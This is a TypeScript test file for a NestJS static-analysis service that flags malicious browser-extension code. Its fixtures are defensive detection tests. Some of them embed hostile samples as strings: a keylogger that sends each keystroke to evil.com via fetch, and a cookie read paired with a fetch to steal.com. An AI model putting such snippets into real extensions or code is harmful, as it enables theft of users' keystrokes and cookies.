import { Test, TestingModule } from '@nestjs/testing';
import { StaticAnalysisService } from '../static-analysis.service.js';
import { AstParserService } from '../ast-parser/ast-parser.service.js';
import { DomainDiscoveryService } from '../domain-discovery/domain-discovery.service.js';
import { StructuredLogger } from '../../common/logger/logger.service.js';
import type { PreprocessorOutput, ProcessedFile, ManifestInfo } from '../../common/interfaces/analysis.interfaces.js';

// ─── Test helpers ─────────────────────────────────────────────────────────────

function makeManifest(overrides: Partial<ManifestInfo> = {}): ManifestInfo {
  return {
    manifestVersion: 2,
    name: 'Test Extension',
    version: '1.0.0',
    apiPermissions: [],
    hostPermissions: [],
    contentScripts: [],
    backgroundScripts: [],
    rawManifest: {},
    ...overrides,
  };
}

function makeFile(overrides: Partial<ProcessedFile> & { path: string }): ProcessedFile {
  return {
    role: 'content_script',
    isObfuscated: false,
    cleanCode: '',
    urls: [],
    domains: [],
    chromeApis: [],
    usesFetch: false,
    usesXHR: false,
    usesEval: false,
    usesDomManipulation: false,
    ...overrides,
  };
}

function makePreprocessed(
  files: ProcessedFile[],
  manifest: Partial<ManifestInfo> = {},
  crxHash = 'hash123',
): PreprocessorOutput {
  const hasObfuscation = files.some((f) => f.isObfuscated);
  return {
    crxHash,
    extractPath: '/tmp/test',
    manifest: makeManifest(manifest),
    files,
    obfuscatedFileCount: files.filter((f) => f.isObfuscated).length,
    hasObfuscation,
    remoteCodeViolations: [],
  };
}

// ─── Tests ────────────────────────────────────────────────────────────────────

describe('StaticAnalysisService', () => {
  let service: StaticAnalysisService;

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [
        StaticAnalysisService,
        AstParserService,
        DomainDiscoveryService,
        StructuredLogger,
      ],
    }).compile();

    service = module.get<StaticAnalysisService>(StaticAnalysisService);
  });

  describe('analyze', () => {
    it('should detect keylogger pattern in a content_script file', async () => {
      const preprocessed = makePreprocessed([
        makeFile({
          path: 'content.js',
          role: 'content_script',
          cleanCode: `document.addEventListener('keyup', function(e) { fetch('https://evil.com/k?k=' + e.key); });`,
          usesFetch: true,
          urls: ['https://evil.com/'],
          domains: [{ domain: 'evil.com', line: 1 }],
        }),
      ], {}, 'hash123');

      const result = await service.analyze(preprocessed, 'job-1');

      expect(result.crxHash).toBe('hash123');
      expect(result.findings.length).toBeGreaterThan(0);
    });

    it('should surface api and host permissions from preprocessor manifest', async () => {
      const preprocessed = makePreprocessed(
        [makeFile({ path: 'bg.js', role: 'background', cleanCode: 'console.log("ok");' })],
        {
          apiPermissions: ['cookies', 'storage', 'tabs'],
          hostPermissions: ['https://google.com/*', 'https://facebook.com/*'],
          rawManifest: {
            permissions: ['cookies', 'storage', 'tabs', 'https://facebook.com/*'],
            host_permissions: ['https://google.com/*'],
          },
        },
        'hash',
      );

      const result = await service.analyze(preprocessed, 'job-2');

      expect(result.manifestPermissions).toEqual(['cookies', 'storage', 'tabs']);
      expect(result.manifestHostPermissions).toContain('https://google.com/*');
      expect(result.manifestHostPermissions).toContain('https://facebook.com/*');
    });

    it('should report obfuscated files as findings and set obfuscationDetected', async () => {
      const preprocessed = makePreprocessed([
        makeFile({ path: 'obf.js', role: 'content_script', isObfuscated: true }),
      ], {}, 'hash');

      const result = await service.analyze(preprocessed, 'job-3');

      expect(result.obfuscationDetected).toBe(true);
      const obfFinding = result.findings.find((f) => f.pattern === 'obfuscated_code');
      expect(obfFinding).toBeDefined();
    });

    it('should skip library files', async () => {
      const preprocessed = makePreprocessed([
        makeFile({
          path: 'jquery.min.js',
          role: 'library',
          cleanCode: `document.cookie; fetch('https://steal.com');`,
          usesFetch: true,
          domains: [{ domain: 'steal.com', line: 1 }],
        }),
      ]);

      const result = await service.analyze(preprocessed, 'job-4');
      expect(result.findings).toEqual([]);
    });

    it('should deduplicate identical findings', async () => {
      const preprocessed = makePreprocessed([
        makeFile({
          path: 'a.js',
          cleanCode: `document.addEventListener('keyup', handler);`,
        }),
      ]);

      const result = await service.analyze(preprocessed, 'job-5');
      const keyFindings = result.findings.filter((f) => f.pattern.includes('keyup'));
      expect(keyFindings.length).toBeLessThanOrEqual(1);
    });

    it('should extract domains from code and manifest host permissions', async () => {
      const preprocessed = makePreprocessed(
        [
          makeFile({
            path: 'bg.js',
            role: 'background',
            cleanCode: `fetch('https://api.malicious-site.com/data');`,
            usesFetch: true,
            urls: ['https://api.malicious-site.com/data'],
            domains: [{ domain: 'api.malicious-site.com', line: 1 }],
          }),
        ],
        {
          hostPermissions: ['https://facebook.com/*'],
          rawManifest: { host_permissions: ['https://facebook.com/*'] },
        },
      );

      const result = await service.analyze(preprocessed, 'job-6');
      const domains = result.discoveredDomains.map((d) => d.domain);
      expect(domains).toContain('facebook.com');
    });

    it('should return empty results for an extension with no analyzable files', async () => {
      const result = await service.analyze(makePreprocessed([]), 'job-7');
      expect(result.findings).toEqual([]);
      expect(result.discoveredDomains).toEqual([]);
    });

    it('should not throw when a file has unparseable code', async () => {
      const preprocessed = makePreprocessed([
        makeFile({ path: 'binary.js', cleanCode: '\x00\x01\x02' }),
        makeFile({ path: 'valid.js', cleanCode: `console.log('valid');` }),
      ]);

      const result = await service.analyze(preprocessed, 'job-8');
      expect(result).toBeDefined();
    });
  });
});
